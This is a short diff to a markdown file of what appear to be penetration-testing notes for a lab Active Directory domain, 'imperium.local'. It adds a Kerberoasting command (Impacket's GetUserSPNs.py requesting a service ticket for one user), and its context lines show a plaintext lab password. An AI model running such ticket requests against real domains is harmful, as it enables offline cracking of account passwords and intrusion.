@@ -45,3 +45,9 @@ mdp: @PentestAD1234!!
 
 ```
 
+## GetUsersSPN
+
+```bash
+GetUserSPNs.py imperium.local/$USER:$PASSWORD -dc-ip $IP -request-user thufir.hawat
+```
+
